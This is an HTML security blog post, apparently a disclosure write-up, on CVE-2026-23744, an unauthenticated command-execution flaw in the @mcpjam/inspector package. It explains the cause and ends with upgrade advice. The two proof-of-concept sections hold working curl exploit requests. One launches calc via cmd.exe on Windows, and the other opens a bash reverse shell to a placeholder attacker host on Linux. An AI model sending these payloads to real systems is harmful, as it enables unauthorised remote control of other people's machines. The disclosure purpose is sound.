@@ -1,0 +1,832 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A detailed breakdown of CVE-2026-23744, exploring its vulnerability mechanics, exploitation workflows, and core mitigation.">
+      
+      
+        <meta name="author" content="x6b">
+      
+      
+        <link rel="canonical" href="https://x6b.me/vulns/RCE-on-MCPJam-%3C=-v1.4.2/">
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.43">
+    
+    
+      
+        <title>RCE-on-MCPJam-<=-CVE-2026-23744 - x6b's things</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-4GQ16PP5Q4"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-4GQ16PP5Q4",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-4GQ16PP5Q4",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#rce-on-mcpjam-v142-cve-2026-23744" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="x6b&#x27;s things" class="md-header__button md-logo" aria-label="x6b's things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            x6b's things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              RCE-on-MCPJam-<=-CVE-2026-23744
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="light-blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="x6b&#x27;s things" class="md-nav__button md-logo" aria-label="x6b's things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    x6b's things
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user" viewBox="0 0 24 24"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+  whoami
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  Vulns
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+  Vulns
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  RCE-on-MCPJam-<=-CVE-2026-23744
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  RCE-on-MCPJam-<=-CVE-2026-23744
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability-descrption" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Vulnerability descrption
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-windows-deployment" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exploitation - Windows deployment
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation - Windows deployment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-linux-deployment" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exploitation - Linux deployment
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation - Linux deployment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Remediation Recommendations
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability-descrption" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Vulnerability descrption
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-windows-deployment" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exploitation - Windows deployment
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation - Windows deployment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-linux-deployment" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exploitation - Linux deployment
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation - Linux deployment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#proof-of-concept_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Remediation Recommendations
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="rce-on-mcpjam-v142-cve-2026-23744">RCE on MCPJam &lt;= v1.4.2 (CVE-2026-23744)<a class="headerlink" href="#rce-on-mcpjam-v142-cve-2026-23744" title="Permanent link">&para;</a></h1>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Severity Rating</strong></td>
+<td style="text-align: left;">Critical</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVSS v4 score</strong></td>
+<td style="text-align: left;">9.2</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVSS v4 vector</strong></td>
+<td style="text-align: left;">CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Component Affected</strong></td>
+<td style="text-align: left;"><code>@mcpjam/inspector</code> (npm package)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Affected Versions</strong></td>
+<td style="text-align: left;"><code>&lt;= 1.4.2</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Patched Version</strong></td>
+<td style="text-align: left;"><code>1.4.3</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="vulnerability-descrption">Vulnerability descrption<a class="headerlink" href="#vulnerability-descrption" title="Permanent link">&para;</a></h2>
+<p><strong>CVE-2026-23744</strong> is a critical remote code execution (RCE) flaw discovered within the <code>@mcpjam/inspector</code> utility, a local-first development platform for Model Context Protocol (MCP) servers. The flaw is primarily caused by an insecure default configuration combined with missing authorisation controls on a critical functional component (CWE-306). By default, the utility binds its HTTP listening server globally to all network interfaces (<code>0.0.0.0</code>) rather than restricting traffic internally via the loopback address (<code>127.0.0.1</code>): 
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">serve</span><span class="p">({</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nx">fetch</span><span class="o">:</span><span class="w"> </span><span class="nx">app</span><span class="p">.</span><span class="nx">fetch</span><span class="p">,</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nx">port</span><span class="o">:</span><span class="w"> </span><span class="nx">SERVER_PORT</span><span class="p">,</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nx">hostname</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// Exposes endpoints globally</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">});</span>
+</span></code></pre></div></p>
+<p>Because the application endpoints are remotely accessible across the network, an unauthenticated attacker can interface directly with the <code>/api/mcp/connect</code> API route. This endpoint is designed to mount and connect to external MCP servers. When a request hits this route, the back-end parses incoming JSON structures to extract execution fields—specifically the <code>command</code> and <code>args</code> vectors inside the <code>serverConfig</code> block—and executes them directly via system subprocess handlers without performing any security checks, input filtering, or authorisation validation.</p>
+<h2 id="exploitation-windows-deployment">Exploitation - Windows deployment<a class="headerlink" href="#exploitation-windows-deployment" title="Permanent link">&para;</a></h2>
+<p>On a Windows asset hosting the vulnerable platform, an attacker can exploit the missing access constraint to execute arbitrary terminal payloads. By passing standard administrative interpreters like <code>cmd.exe</code> or <code>powershell.exe</code> into the invalidated <code>command</code> variable, paired with an instruction execution flag (such as <code>/c</code>), an external user can force the underlying operating system to run unauthorised tasks under the context of the running node application process.</p>
+<h3 id="proof-of-concept">Proof-of-Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link">&para;</a></h3>
+<p>An RCE attack can be initialised by transmitting a structured HTTP <code>POST</code> request directly to the target network socket (port <code>6274</code> by default):</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>http://&lt;TARGET_WINDOWS_IP&gt;:6274/api/mcp/connect<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>--header<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>--data<span class="w"> </span><span class="s2">&quot;{\&quot;serverConfig\&quot;:{\&quot;command\&quot;:\&quot;cmd.exe\&quot;,\&quot;args\&quot;:[\&quot;/c\&quot;, \&quot;calc\&quot;],\&quot;env\&quot;:{}},\&quot;serverId\&quot;:\&quot;mytest\&quot;}&quot;</span>
+</span></code></pre></div>
+<h3 id="attack-vector-breakdown">Attack Vector Breakdown<a class="headerlink" href="#attack-vector-breakdown" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>API Delivery:</strong> The request interfaces over the network with the vulnerable connection handler path (<code>/api/mcp/connect</code>).</li>
+<li><strong>Interpreter Target:</strong> The payload maps <code>cmd.exe</code> to the <code>command</code> variable, instructing the Windows platform to run the Command Prompt utility.</li>
+<li><strong>Argument Hijacking:</strong> The <code>args</code> list provides the execution payload instructions (<code>/c</code> to execute and terminate, followed by the target executable command, such as <code>calc</code>).</li>
+<li><strong>Subprocess Trigger:</strong> The inspector processes the input block directly. Because it lacks parameter isolation, the environment executes <code>cmd.exe /c calc</code>, immediately triggering the command payload on the remote system with zero user interaction.</li>
+</ol>
+<h2 id="exploitation-linux-deployment">Exploitation - Linux deployment<a class="headerlink" href="#exploitation-linux-deployment" title="Permanent link">&para;</a></h2>
+<p>While public exploit code and disclosures traditionally focus on Windows environments (using <code>cmd.exe /c</code>), testing indicates that the underlying execution block parses system commands via default Linux shells natively.</p>
+<p>On a Linux runtime environment, an attacker can exploit the missing verification boundary by structuring a payload to invoke <code>==/bin/bash==</code> along with a standard file-descriptor redirection sequence (<code>&gt;&amp; /dev/tcp/</code>), achieving an interactive reverse shell callback over the network.</p>
+<h3 id="proof-of-concept_1">Proof-of-Concept<a class="headerlink" href="#proof-of-concept_1" title="Permanent link">&para;</a></h3>
+<p>An RCE attack can be initialised by transmitting a structured HTTP <code>POST</code> request directly to the target network socket containing the Linux execution payload:
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl<span class="w"> </span>http://&lt;TARGET_LINUX_IP&gt;:6274/api/mcp/connect<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>--header<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>--data<span class="w"> </span><span class="s2">&quot;{\&quot;serverConfig\&quot;:{\&quot;command\&quot;:\&quot;/bin/bash\&quot;,\&quot;args\&quot;:[\&quot;-c\&quot;, \&quot;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;ATTACKER_PORT&gt; 0&gt;&amp;1\&quot;],\&quot;env\&quot;:{}},\&quot;serverId\&quot;:\&quot;mytest\&quot;}&quot;</span>
+</span></code></pre></div></p>
+<h3 id="attack-vector-breakdown_1">Attack Vector Breakdown<a class="headerlink" href="#attack-vector-breakdown_1" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>API Delivery:</strong> The request interfaces over the network with the vulnerable connection handler path (<code>/api/mcp/connect</code>).</li>
+<li><strong>Interpreter Target:</strong> The payload maps <code>/bin/bash</code> to the <code>command</code> variable, instructing the Linux platform to spawn a bash environment.</li>
+<li><strong>Argument Hijacking:</strong> The <code>args</code> list provides the execution flag <code>-c</code> followed by a classic TCP backpipe string (<code>bash -i &gt;&amp; /dev/tcp/... 0&gt;&amp;1</code>).</li>
+<li><strong>Execution Delivery:</strong> The backend processes the object inputs immediately without validation, executing the backpipe command under the privilege context of the service account running the node application process, establishing an outbound interactive terminal session.</li>
+</ol>
+<h2 id="remediation-recommendations">Remediation Recommendations<a class="headerlink" href="#remediation-recommendations" title="Permanent link">&para;</a></h2>
+<p>To eliminate <code>CVE-2026-23744</code> and protect deployment environments against remote command execution, developers and platform administrators must apply the following remediation steps immediately.</p>
+<p>The vendor has addressed this vulnerability by implementing safety validation and input <em>parameterization</em> in commit <code>e6b9cf9</code>. Production systems must upgrade the <code>@mcpjam/inspector</code> package to at least <strong>version 1.4.3</strong> at the time of this post to replace the vulnerable command handling code:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>npm update @mcpjam/inspector@latest
+</span></code></pre></div></p>
+<hr />
+<h1 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h1>
+<p>The analysis detailed in this post was compiled by referencing the official security advisories and documentation detailed below.</p>
+<ul>
+<li><a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></li>
+</ul>
+<div class="admonition warning">
+<p class="admonition-title">AI generated content</p>
+<p>Some of the content on this blog is generated by AI and may contain mistakes. If you notice an issue or technical oversight, please reach out via email at <a href="mailto:hello@x6b.me">hello@x6b.me</a>.</p>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">CVE-2026-23744</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">RCE</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">MCPJam</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">GHSA-232v-j27c-5pp6</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 x6b
+
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":[],"search":"../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.6e5f0216.min.js"></script>
+      
+    
+  </body>
+</html>
